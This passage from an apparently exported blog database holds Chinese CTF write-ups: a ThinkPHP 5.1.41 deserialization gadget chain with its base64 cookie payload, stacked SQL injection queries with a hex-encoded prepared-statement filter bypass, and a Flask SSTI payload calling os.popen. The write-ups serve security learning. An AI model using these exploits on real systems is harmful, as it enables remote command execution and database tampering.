Windows()));\\n?>\\n\\n\\n\",\"language\":\"php\"}],[\"code\",{\"code\":\"TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eXkiO2E6Mjp7aTowO3M6NToiaGVsbG8iO2k6MTtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHl5IjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ==\\n\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120101543.png\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.thinkphp.cn/\"]]],\"sections\":[[1,\"h3\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"Thinkphp v5.1.41 反序列化漏洞\"]]],[1,\"blockquote\",[[0,[],0,\"工具burpsuite\"]]],[1,\"h3\",[[0,[],0,\"1、寻找注入点\"]]],[1,\"blockquote\",[[0,[],0,\"查看页面的内容并没有发现什么有用的代码，然后通过输入用户名提交完，换页面后刷新一下抓包可以发现多了一个cookie\"]]],[1,\"p\",[]],[10,0],[1,\"blockquote\",[[0,[],0,\"这串cookie是base64加密后的序列化对象，是可以解密的，如下，但解密完可以发现并不知道有什么用\"]]],[10,1],[1,\"blockquote\",[[0,[],0,\"然后在网站地址后面乱输入一些不存在的参数，可以发现报错了\"]]],[10,2],[1,\"blockquote\",[[0,[],0,\"然后就阔以发现是\"],[0,[0],1,\"ThinkPHP\"],[0,[],0,\" V5.1.41 LTS 的序列化漏洞\"]]],[1,\"blockquote\",[[0,[],0,\"然后就阔以去百度或者谷歌了\"]]],[1,\"blockquote\",[[0,[],0,\"这里贴一下exp，为什么这么写我不知道（我是菜鸡），反正执行一下可以得到序列化对象字符串\"]]],[10,3],[1,\"h3\",[[0,[],0,\"2、获取flag\"]]],[10,4],[1,\"blockquote\",[[0,[],0,\"以上exp可以直接更改cookie里面的tp_user为上面的值，然后get传参xyy=env执行命令就可以获取flag了。\"]]],[10,5],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h3 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h3><blockquote>Thinkphp v5.1.41 反序列化漏洞</blockquote><blockquote>工具burpsuite</blockquote><h3 id=\"1%E3%80%81%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9\">1、寻找注入点</h3><blockquote>查看页面的内容并没有发现什么有用的代码，然后通过输入用户名提交完，换页面后刷新一下抓包可以发现多了一个cookie</blockquote><p></p><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119233727.png\" class=\"kg-image\" alt=\"img\" loading=\"lazy\"></figure><blockquote>这串cookie是base64加密后的序列化对象，是可以解密的，如下，但解密完可以发现并不知道有什么用</blockquote><pre><code>O:17:\"first\\second\\user\":2:{s:8:\"username\";s:1:\"s\";s:8:\"password\";N;}\n</code></pre><blockquote>然后在网站地址后面乱输入一些不存在的参数，可以发现报错了</blockquote><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119234621.png\" class=\"kg-image\" alt=\"img\" loading=\"lazy\"></figure><blockquote>然后就阔以发现是<a href=\"http://www.thinkphp.cn/\">ThinkPHP</a> V5.1.41 LTS 的序列化漏洞</blockquote><blockquote>然后就阔以去百度或者谷歌了</blockquote><blockquote>这里贴一下exp，为什么这么写我不知道（我是菜鸡），反正执行一下可以得到序列化对象字符串</blockquote><pre><code class=\"language-php\">&lt;?php\nnamespace think;\nabstract class Model\n{\n\tprotected $append = [];\n\tprivate $data = [];\n    // 这里是定义后门的地方\n\tfunction __construct()\n\t{\n        // 新增一个get参数xyy\n\t\t$this-&gt;append = [\"xyy\"=&gt;[\"hello\",\"world\"]];\n\t\t$this-&gt;data = array('xyy'=&gt;new Request());\n\t}\n}\nclass Request\n{\n\tprotected $hook = [];\n\tprotected $filter;\n\tprotected $config = [\n\t// 表单请求类型伪装变量\n\t'var_method'       =&gt; '_method',\n\t// 表单ajax伪装变量\n\t'var_ajax'         =&gt; '_ajax',\n\t// 表单pjax伪装变量\n\t'var_pjax'         =&gt; '_pjax',\n\t// PATHINFO变量名 用于兼容模式\n\t'var_pathinfo'     =&gt; 's',\n\t// 兼容PATH_INFO获取\n\t'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],\n\t// 默认全局过滤方法 用逗号分隔多个\n\t'default_filter'   =&gt; '',\n\t// 域名根，如thinkphp.cn\n\t'url_domain_root'  =&gt; '',\n\t// HTTPS代理标识\n\t'https_agent_name' =&gt; '',\n\t// IP代理获取标识\n\t'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',\n\t// URL伪静态后缀\n\t'url_html_suffix'  =&gt; 'html',\n\t];\n\tfunction __construct()\n\t{\n\t\t$this-&gt;filter = \"system\";\n\t\t$this-&gt;config = [\"var_ajax\"=&gt;''];\n\t\t$this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];\n\t}\n}\nnamespace think\\process\\pipes;\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n\tprivate $files = [];\n\tpublic function __construct()\n\t{\n\t\t$this-&gt;files=[new Pivot()];\n\t}\n}\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?&gt;\n\n\n</code></pre><h3 id=\"2%E3%80%81%E8%8E%B7%E5%8F%96flag\">2、获取flag</h3><pre><code class=\"language-bash\">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eXkiO2E6Mjp7aTowO3M6NToiaGVsbG8iO2k6MTtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHl5IjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ==\n\n</code></pre><blockquote>以上exp可以直接更改cookie里面的tp_user为上面的值，然后get传参xyy=env执行命令就可以获取flag了。</blockquote><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120101543.png\" class=\"kg-image\" alt loading=\"lazy\"></figure>",
                        "comment_id": "63798e87f7e27b274c0bdf80",
                        "plaintext": "0、知识点与工具\n\nThinkphp v5.1.41 反序列化漏洞\n\n工具burpsuite\n\n\n1、寻找注入点\n\n查看页面的内容并没有发现什么有用的代码，然后通过输入用户名提交完，换页面后刷新一下抓包可以发现多了一个cookie\n\n\n\n这串cookie是base64加密后的序列化对象，是可以解密的，如下，但解密完可以发现并不知道有什么用\n\nO:17:\"first\\second\\user\":2:{s:8:\"username\";s:1:\"s\";s:8:\"password\";N;}\n\n\n然后在网站地址后面乱输入一些不存在的参数，可以发现报错了\n\n然后就阔以发现是ThinkPHP V5.1.41 LTS 的序列化漏洞\n\n然后就阔以去百度或者谷歌了\n\n这里贴一下exp，为什么这么写我不知道（我是菜鸡），反正执行一下可以得到序列化对象字符串\n\n<?php\nnamespace think;\nabstract class Model\n{\n\tprotected $append = [];\n\tprivate $data = [];\n    // 这里是定义后门的地方\n\tfunction __construct()\n\t{\n        // 新增一个get参数xyy\n\t\t$this->append = [\"xyy\"=>[\"hello\",\"world\"]];\n\t\t$this->data = array('xyy'=>new Request());\n\t}\n}\nclass Request\n{\n\tprotected $hook = [];\n\tprotected $filter;\n\tprotected $config = [\n\t// 表单请求类型伪装变量\n\t'var_method'       => '_method',\n\t// 表单ajax伪装变量\n\t'var_ajax'         => '_ajax',\n\t// 表单pjax伪装变量\n\t'var_pjax'         => '_pjax',\n\t// PATHINFO变量名 用于兼容模式\n\t'var_pathinfo'     => 's',\n\t// 兼容PATH_INFO获取\n\t'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],\n\t// 默认全局过滤方法 用逗号分隔多个\n\t'default_filter'   => '',\n\t// 域名根，如thinkphp.cn\n\t'url_domain_root'  => '',\n\t// HTTPS代理标识\n\t'https_agent_name' => '',\n\t// IP代理获取标识\n\t'http_agent_ip'    => 'HTTP_X_REAL_IP',\n\t// URL伪静态后缀\n\t'url_html_suffix'  => 'html',\n\t];\n\tfunction __construct()\n\t{\n\t\t$this->filter = \"system\";\n\t\t$this->config = [\"var_ajax\"=>''];\n\t\t$this->hook = [\"visible\"=>[$this,\"isAjax\"]];\n\t}\n}\nnamespace think\\process\\pipes;\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n\tprivate $files = [];\n\tpublic function __construct()\n\t{\n\t\t$this->files=[new Pivot()];\n\t}\n}\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?>\n\n\n\n\n\n2、获取flag\n\nTzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eXkiO2E6Mjp7aTowO3M6NToiaGVsbG8iO2k6MTtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHl5IjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ==\n\n\n\n以上exp可以直接更改cookie里面的tp_user为上面的值，然后get传参xyy=env执行命令就可以获取flag了。",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/57938f3f3aa18ecf46ea0b74feaac18a.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-20T02:18:47.000Z",
                        "updated_at": "2022-11-20T02:26:16.000Z",
                        "published_at": "2022-11-20T02:20:26.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6379b121f7e27b274c0bdf95",
                        "uuid": "ee6d8e0c-b611-46ab-894b-50c9ea44956c",
                        "title": "Week3 multiSQL 200",
                        "slug": "week3-multisql-200",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"admin' or '1'='1\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105036.png\"}],[\"code\",{\"code\":\"1';show databases;\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105549.png\"}],[\"code\",{\"code\":\"1';show tables from english;\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105731.png\"}],[\"code\",{\"code\":\"1';show columns from score;\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120110049.png\"}],[\"code\",{\"code\":\"1';update english set listen=100 where username='火华';\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201220894.png\"}],[\"code\",{\"code\":\"1';replace into score values(\\\"火华\\\",2000,200,200);#\\n1';delete from score where listen=11;#\\n\",\"language\":\"java\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123253.png\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123143.png\"}],[\"code\",{\"code\":\"username=1';set @a=update score set listen = 1000 where username = '火华';prepare b from @a;execute b;#\\n转十六进制后\\nusername=1';set @a = 0x7570646174652073636f726520736574206c697374656e203d2031303020776865726520757365726e616d65203d2027e781abe58d8e273b;prepare b from @a;execute b;#\\n\\n\"}]],\"markups\":[[\"strong\"]],\"sections\":[[1,\"h3\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"sql注入\"]]],[1,\"blockquote\",[[0,[],0,\"堆叠注入\"]]],[1,\"blockquote\",[[0,[],0,\"工具burpsuite、postman\"]]],[1,\"h3\",[[0,[],0,\"1、分析页面\"]]],[1,\"blockquote\",[[0,[],0,\"首先整个网页有俩个页面，分别是index.php与verify.php，\"]]],[1,\"blockquote\",[[0,[],0,\"主页那边需要一个传入一个参数，然后下面就会显示分数\"]]],[1,\"blockquote\",[[0,[],0,\"首先使用万能钥匙查询一下\"]]],[10,0],[10,1],[1,\"blockquote\",[[0,[],0,\"发现整个表中好像只要一位同学有成绩\"]]],[1,\"blockquote\",[[0,[],0,\"这时可以想起题目页面有提示信息，提示信息为堆叠注入，那么我们就阔以获取一些信息\"]]],[1,\"h3\",[[0,[],0,\"2、注入\"]]],[1,\"blockquote\",[[0,[],0,\"首先爆库\"]]],[10,2],[10,3],[1,\"blockquote\",[[0,[],0,\"在看一下English的表\"]]],[10,4],[10,5],[1,\"blockquote\",[[0,[],0,\"再接着爆字段\"]]],[10,6],[10,7],[1,\"h3\",[[0,[],0,\"3、更改数据\"]]],[1,\"blockquote\",[[0,[],0,\"再回想起题目的另一个提示，update的更改，那么flag一个是在verify页面中，然后咋们要让成绩总分大于425分\"]]],[1,\"blockquote\",[[0,[],0,\"然后使用堆叠注入修改成绩会发现存在过滤，过滤了\"],[0,[0],1,\"update\"]]],[10,8],[10,9],[1,\"blockquote\",[[0,[],0,\"后面继续测试会发现，还过滤了：\"],[0,[0],1,\"select、insert、union\"]]],[1,\"blockquote\",[[0,[],0,\"虽然过滤insert，但是insert有替换的关键字 -> replace\"]]],[1,\"blockquote\",[[0,[],0,\"那么就阔以使用\"],[0,[0],1,\"replace\"],[0,[],0,\"插入一条总分超过425分的数据，然后把原来的那一条数据给删除掉\"]]],[10,10],[1,\"blockquote\",[[0,[],0,\"然后点击验证成绩就可以获得flag\"]]],[10,11],[10,12],[1,\"blockquote\",[[0,[],0,\"flag{Ju3t_use_mo2e_t2en_0ne_SQL}\"]]],[1,\"h3\",[[0,[],0,\"4、扩展\"]]],[1,\"p\",[[0,[],0,\"使用十六进制替换成绩\"]]],[10,13],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h3 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h3><blockquote>sql注入</blockquote><blockquote>堆叠注入</blockquote><blockquote>工具burpsuite、postman</blockquote><h3 id=\"1%E3%80%81%E5%88%86%E6%9E%90%E9%A1%B5%E9%9D%A2\">1、分析页面</h3><blockquote>首先整个网页有俩个页面，分别是index.php与verify.php，</blockquote><blockquote>主页那边需要一个传入一个参数，然后下面就会显示分数</blockquote><blockquote>首先使用万能钥匙查询一下</blockquote><pre><code>admin' or '1'='1\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105036.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>发现整个表中好像只要一位同学有成绩</blockquote><blockquote>这时可以想起题目页面有提示信息，提示信息为堆叠注入，那么我们就阔以获取一些信息</blockquote><h3 id=\"2%E3%80%81%E6%B3%A8%E5%85%A5\">2、注入</h3><blockquote>首先爆库</blockquote><pre><code>1';show databases;\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105549.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>在看一下English的表</blockquote><pre><code>1';show tables from english;\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120105731.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>再接着爆字段</blockquote><pre><code>1';show columns from score;\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120110049.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><h3 id=\"3%E3%80%81%E6%9B%B4%E6%94%B9%E6%95%B0%E6%8D%AE\">3、更改数据</h3><blockquote>再回想起题目的另一个提示，update的更改，那么flag一个是在verify页面中，然后咋们要让成绩总分大于425分</blockquote><blockquote>然后使用堆叠注入修改成绩会发现存在过滤，过滤了<strong>update</strong></blockquote><pre><code>1';update english set listen=100 where username='火华';\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201220894.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>后面继续测试会发现，还过滤了：<strong>select、insert、union</strong></blockquote><blockquote>虽然过滤insert，但是insert有替换的关键字 -&gt; replace</blockquote><blockquote>那么就阔以使用<strong>replace</strong>插入一条总分超过425分的数据，然后把原来的那一条数据给删除掉</blockquote><pre><code class=\"language-java\">1';replace into score values(\"火华\",2000,200,200);#\n1';delete from score where listen=11;#\n</code></pre><blockquote>然后点击验证成绩就可以获得flag</blockquote><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123253.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><figure class=\"kg-card kg-image-card\"><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120123143.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><blockquote>flag{Ju3t_use_mo2e_t2en_0ne_SQL}</blockquote><h3 id=\"4%E3%80%81%E6%89%A9%E5%B1%95\">4、扩展</h3><p>使用十六进制替换成绩</p><pre><code>username=1';set @a=update score set listen = 1000 where username = '火华';prepare b from @a;execute b;#\n转十六进制后\nusername=1';set @a = 0x7570646174652073636f726520736574206c697374656e203d2031303020776865726520757365726e616d65203d2027e781abe58d8e273b;prepare b from @a;execute b;#\n\n</code></pre>",
                        "comment_id": "6379b121f7e27b274c0bdf95",
                        "plaintext": "0、知识点与工具\n\nsql注入\n\n堆叠注入\n\n工具burpsuite、postman\n\n\n1、分析页面\n\n首先整个网页有俩个页面，分别是index.php与verify.php，\n\n主页那边需要一个传入一个参数，然后下面就会显示分数\n\n首先使用万能钥匙查询一下\n\nadmin' or '1'='1\n\n\n发现整个表中好像只要一位同学有成绩\n\n这时可以想起题目页面有提示信息，提示信息为堆叠注入，那么我们就阔以获取一些信息\n\n\n2、注入\n\n首先爆库\n\n1';show databases;\n\n\n在看一下English的表\n\n1';show tables from english;\n\n\n再接着爆字段\n\n1';show columns from score;\n\n\n\n3、更改数据\n\n再回想起题目的另一个提示，update的更改，那么flag一个是在verify页面中，然后咋们要让成绩总分大于425分\n\n然后使用堆叠注入修改成绩会发现存在过滤，过滤了update\n\n1';update english set listen=100 where username='火华';\n\n\n后面继续测试会发现，还过滤了：select、insert、union\n\n虽然过滤insert，但是insert有替换的关键字 -> replace\n\n那么就阔以使用replace插入一条总分超过425分的数据，然后把原来的那一条数据给删除掉\n\n1';replace into score values(\"火华\",2000,200,200);#\n1';delete from score where listen=11;#\n\n\n然后点击验证成绩就可以获得flag\n\nflag{Ju3t_use_mo2e_t2en_0ne_SQL}\n\n\n4、扩展\n\n使用十六进制替换成绩\n\nusername=1';set @a=update score set listen = 1000 where username = '火华';prepare b from @a;execute b;#\n转十六进制后\nusername=1';set @a = 0x7570646174652073636f726520736574206c697374656e203d2031303020776865726520757365726e616d65203d2027e781abe58d8e273b;prepare b from @a;execute b;#\n\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/1945f57c954d67fb7666dd00e19d37c7.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-20T04:46:25.000Z",
                        "updated_at": "2022-11-20T04:48:23.000Z",
                        "published_at": "2022-11-20T04:48:23.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "637a1a29f7e27b274c0bdfae",
                        "uuid": "8c1fd9d0-8abb-4bf9-b24e-d4e4fc1aca25",
                        "title": "Week4 BabySSTI_Two 200",
                        "slug": "untitled",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"回顾一下Python的内置属性\\n    __class__：每个类都有的,表示当前类\\n    __bases__：每一个类都有的一个属性，列出其基类\\n    __mro__：列举类解析函数的执行顺序，也就是解析一个类构造函数的调用顺序\\n    __subclasses__：获取所有子类集合\\n    __init__：初始化一个类\\n    __globals__：只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量\\n    __dict__：可写；以字典的形式返回命名空间所支持的任意自定义的函数属性\\n    __builtins__：定义内建名称空间（Python在启动时会首先加载内建名称空间）\\n    \\t在控制台直接输入__builtins__时（Python2）会出现__builtin__\\n    __import__\\n    __code__：可写；返回已编译的函数对象\\n    __name__：获取函数的名称\\n    __doc__：用于获取函数的文档说明，如果没有，则返回 None\\n    __module__：返回函数所在的模块，如果无则返回None\\n    __defaults__：以元组的形式返回函数的默认参数，如果无默认参数则返回None\\n    __closure__：以包含cell的元组形式返回闭包所包含的自由变量\\n    \\n    \\n\",\"language\":\"java\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154320.png\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120154344.png\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120160025.png\"}],[\"code\",{\"code\":\"{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('ls%09/')['read']()}}\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211201613715.png\"}],[\"code\",{\"code\":\"{{[123]['__CLASS__'|lower]['__MRO__'|lower][-1]['__SUBCLASSES__'|lower]()[117]['__INIT__'|lower]['__GLOBALS__'|lower]['__BUILTINS__'|lower]['__IMPORT__'|lower]('os')['POPEN'|lower]('tail%09/f*')['read']()}}\\n\",\"language\":\"bash\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120161145.png\"}]],\"markups\":[[\"code\"],[\"strong\"]],\"sections\":[[1,\"h1\",[]],[1,\"h2\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"Flask SSTI模板注入\"]]],[1,\"blockquote\",[[0,[],0,\"远程代码执行\"]]],[1,\"blockquote\",[[0,[],0,\"工具burpsuite\"]]],[10,0],[1,\"blockquote\",[[0,[],0,\"关于\"],[0,[0,1],2,\"__builtins__\"]]],[3,\"ul\",[[[0,[],0,\"在启动Python解释器或运行一个Python程序时\"]],[[0,[],0,\"内建名称空间都是从\"],[0,[0],1,\"__builtins__\"],[0,[],0,\"模块中加载的\"]],[[0,[],0,\"只是\"],[0,[0],1,\"__builtins__\"],[0,[],0,\" 本身是对Python内建模块\"],[0,[0],1,\"__builtin__\"],[0,[],0,\"的引用\"]],[[0,[],0,\"如果是在主模块\"],[0,[0],1,\"__main__\"],[0,[],0,\"中，\"],[0,[0],1,\"__builtins__\"],[0,[],0,\"直接引用\"],[0,[0],1,\"__builtin__\"],[0,[],0,\"模块，此时模块名\"],[0,[0],1,\"__builtins__\"],[0,[],0,\"与模块名``\"],[0,[1],1,\"builtin\"],[0,[0],1,\"指向的都是同一个模块，即\"],[0,[],0,\"`内建模块（这里要注意变量名和对象本身的区别）\"]],[[0,[],0,\"如果不是在主模块中，那么\"],[0,[0],1,\"__builtins__\"],[0,[],0,\"只是引用了\"],[0,[0],1,\"__builtin__.__dict__\"]]]],[1,\"h2\",[[0,[],0,\"1、分析\"]]],[1,\"blockquote\",[[0,[],0,\"flask模板注入第二弹！\"]]],[1,\"blockquote\",[[0,[],0,\"首先页面也就是需要传入一个name参数，然后页面就会出现效果\"]]],[10,1],[1,\"blockquote\",[[0,[],0,\"然后继续测试\"]]],[10,2],[1,\"blockquote\",[[0,[],0,\"表达式还是执行了\"]]],[1,\"blockquote\",[[0,[],0,\"既然是第二弹，那肯定做了过滤\"]]],[1,\"blockquote\",[[0,[],0,\"比如：class、subclass、init、globals、popen、空格、等等好多\"]]],[1,\"blockquote\",[[0,[],0,\"绕过的方法也有很多，但在这题能有用的发现有两种如：大写转小写绕过和编码绕过（感觉编码绕过是万能的）（bushi\"]]],[10,3],[1,\"blockquote\",[[0,[],0,\"然后掏出之前的写payload加点料，然后看一下flag是否在根目录，因为空格也过滤掉了，但是使用url编码的空格可以通过\"]]],[10,4],[10,5],[1,\"blockquote\",[[0,[],0,\"最后获取flag\"]]],[10,6],[10,7]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h1></h1><h2 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h2><blockquote>Flask SSTI模板注入</blockquote><blockquote>远程代码执行</blockquote><blockquote>工具burpsuite</blockquote><pre><code class=\"language-java\">回顾一下Python的内置属性\n    __class__：每个类都有的,表示当前类\n    __bases__：每一个类都有的一个属性，列出其基类\n    __mro__：列举类解析函数的执行顺序，也就是解析一个类构造函数的调用顺序\n    __subclasses__：获取所有子类集合\n    __init__：初始化一个类\n    __globals__：只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量\n    __dict__：可写；以字典的形式返回命名空间所支持的任意自定义的函数属性\n    __builtins__：定义内建名称空间（Python在启动时会首先加载内建名称空间）\n    \t在控制台直接输入__builtins__时（Python2）会出现__builtin__\n    __import__\n    __code__：可写；返回已编译的函数对象\n    __name__：获取函数的名称\n    __doc__：用于获取函数的文档说明，如果没有，则返回 None\n    __module__：返回函数所在的模块，如果无则返回None\n    __defaults__：以元组的形式返回函数的默认参数，如果无默认参数则返回None\n    __closure__：以包含cell的元组形式返回闭包所包含的自由变量\n    \n    \n</code></pre><blockquote>关于<code><strong>__builtins__</strong></code></blockquote><ul><li>在启动Python解释器或运行一个Python程序时</li><li>内建名称空间都是从<code>__builtins__</code>模块中加载的</li><li>只是<code>__builtins__</code> 本身是对Python内建模块<code>__builtin__</code>的引用</li><li>如果是在主模块<code>__main__</code>中，<code>__builtins__</code>直接引用<code>__builtin__</code>模块，此时模块名<code>__builtins__</code>与模块名``<strong>builtin</strong><code>指向的都是同一个模块，即</code>`内建模块（这里要注意变量名和对象本身的区别）</li><li>如果不是在主模块中，那么<code>__builtins__</code>只是引用了<code>__builtin__.__dict__</code></li></ul><h2 id=\"1%E3%80%81%E5%88%86%E6%9E%90\">1、分析</h2><blockquote>flask模板注入第二弹！</blockquote><blockquote>首先页面也就是需要传入一个name参数，然后页面就会出现效果</blockquote><figure 